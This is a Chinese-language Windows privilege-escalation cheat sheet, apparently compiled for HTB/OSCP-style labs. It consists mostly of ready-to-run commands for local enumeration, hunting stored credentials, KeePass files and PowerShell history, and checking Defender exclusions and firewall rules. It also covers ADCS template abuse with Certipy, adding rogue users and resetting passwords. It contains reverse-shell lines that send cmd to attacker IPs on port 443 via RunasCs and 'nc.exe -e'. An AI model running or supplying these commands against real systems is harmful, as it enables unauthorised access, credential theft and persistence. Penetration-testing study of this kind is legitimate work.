##### 枚举命令
```powershell
C:\Windows\system32\spool\drivers\color      可以下载二进制文件到这个目录
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0; (设置初始变量[执行命令报错时])

whoami 
	whoami /priv
	whoami /groups
net users  查看本地计算机上所有用户账户的列表
	net user [NAME]  
net groups
	Get-LocalGroup
	net groups [NAME]
	Get-LocalGroupMember Username
Get-Process   (进程)
Get-Process | Where-Object { $_.Id -eq 2492 } | Select-Object Path   (查找可疑进程(ID)的路径)
hostname
systeminfo
cmd /c ver (版本信息)
wmic qwe (更新日志)
tasklist /SVC  (正在运行的服务)
netstat -ano [| find "xxx"]
	netstat -ano | findstr /i "tcp"
cmdkey /list  列出当前计算机上存储的凭据信息
schtasks /query /fo LIST /v  查看计划任务
	schtasks /query /fo LIST /v | Select-String -Pattern "moss" -Context 3,3 (moss为用户名，猜测可能的路径)
Get-ChildItem Env:  (powershell 查看环境变量 , 可能会存在凭据信息)
net view \\[Hostname]   (查看本机共享文件夹，能不能通过钓鱼拿到shell或者hash)

C:\$Recycle.Bin
C:\inetpub\wwwroot\bin
gci -Recurse c:\User | select FullName  递归查找users目录下所有文件
dir /a  |  ls -force | dir -force
C:\Users\[USER]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt    (查看历史记录)
Get-ChildItem -Path C:\Users\offsec\ -Include .txt,.pdf,.xls,.xlsx,.doc,.docx -File -Recurse -ErrorAction

sc query windenfend   查看windows denfender是否开启
netsh firewall show state  查看防火墙设置
netsh advfirewall firewall show rule name=all  (查看计算机防火墙规则)
cmd.exe /c powershell.exe -c Get-NetFirewallRule -Action Block -Enabled True -Direction Outbound (查看计算机防火墙规则)
reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths"     Windows Defender 的文件路径排除列表

(检查所有已安装的应用程序)
	Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
	Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
	
qwinsta *  (当前windows中登录的会话信息)    
	如果不能执行可以使用RunasCs.exe:  .\Run.exe x x qwinsta -l 9
powershell -c get-psdrive -psprovider filesystem (检索系统磁盘)


# 列出user目录非默认文件
Get-ChildItem -Path C:\Users\ -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Extension -ne '.lnk' -and $_.Extension -ne '.url' }
# 寻找 keepass 文件
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
# 寻找 git 目录
Get-ChildItem -Path C:\ -Filter .git -Recurse -Force -Directory -ErrorAction SilentlyContinue


winpeas 如果有mysql / phpmyadmin , 可以查看创建的文件是否有管理员权限 ， 如果是则是一种提权的方式 (内网可以把80转发出来用phpmyadmin 更方便操作)
可以尝试利用systeminfo的tzres.dll，或者 WerTrigger（见利用）

icacls xxxx   (查看文件(夹)的权限)
```

##### 枚举脚本
https://github.com/PowerShellMafia/PowerSploit/tree/master
```powershell
~/tool/PowerSploit-master/Privesc/PowerUp.ps1
Invoke-AllChecks
(可疑服务 拥有可修改权限 滥用方式见下方 可修改服务二进制程序滥用)

winpeas.exe log
winpspy.exe

https://github.com/rasta-mouse/Sherlock
Sherlock.ps1 / Watson  都可以枚举主机上的内核漏洞

```

- ADCS (易受攻击的证书模板) 枚举 !!!!!!!!!!!!!!!!!!!!
```bash
如果出现问题可以尝试apt remove/install certipy-ad
certipy-ad find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb -text -stdout -vulnerable
```

https://github.com/itm4n/PrivescCheck
```powershell
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

-  MailSniper (枚举目标域的 NetBIOS 名称，*Microsoft Exchange 环境, 比如说 outlook* )
https://github.com/dafthack/MailSniper
```powershell
Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
[*] Harvesting domain name from the server at mail.cyberbotic.io
The domain appears to be: CYBER or cyberbotic.io
```
可以从 `cyberbotic.io` 中继续枚举有用的信息。


##### 添加凭据，登录类操作
- Windows 内增加凭据操作，无 winRM 情况：
```powershell
$user = "Hostname\Username"
$pass = ""
$secstr = New-Object -TypeName System.Security.SecureString
$pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
Invoke-Command -ScriptBlock { CMD } -Credential $cred -Computer localhost
```

- Remote Desktop 中也可以尝试 Runas ，以 backupadmin 身份运行 cmd
```powershell
runas /user:backupadmin cmd
runas /user:dave2 "powershell -Command Start-Process powershell -Verb RunAs"   (运行dave2的管理员powershell)
```

- RunasCs
https://github.com/antonioCoco/RunasCs
```powershell
.\runascs.exe C.Bum Tikkycoll_431012284 -r 10.10.16.21:443 cmd
```
登录用户后反弹一个 cmd 到本地的443端口

- PS Session 中使用 runas 脚本：
https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1?source=post_page-----b95d3146cfe9--------------------------------
```powershell
. .\Invoke-RunasCs.ps1
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "C:\\programdata\\nc.exe -e cmd 192.168.45.170 443"
```


##### 修改类操作
- 修改用户的密码
```powershell
net user USERNAME PASSWORD
--------------------------------------------
. .\powerview.ps1
$pass = ConvertTo-SecureString 'xxx' -AsPlainText -Force  
Set-DomainUserPassword -Identity USERNAME -AccountPassword $pass
```

- 添加命令
```powershell
net user xek xekOnerR! /add  (增加用户)
net group "xxxxxxxxx" /add xek (域用户加入到组)
```

##### 枚举防火墙/AppLocker
```powershell
Get-NetFirewallRule -PolicyStore ActiveStore | where { $_.Action -eq 'Block' }   (出入站规则)
Get-AppLockerPolicy -Effective -Xml   (将信息全部复制到VS CODE ;格式化代码后ctrl + k ,ctrl + 0 即可层级展开阅读)

Get-NetFirewallRule -PolicyStore ActiveStore -Name "{D7871DF0-F71B-4BD0-B7DE-F8E6966A3640}" | Get-NetFirewallApplicationFilter   (指定Name搜索过滤的应用)
```

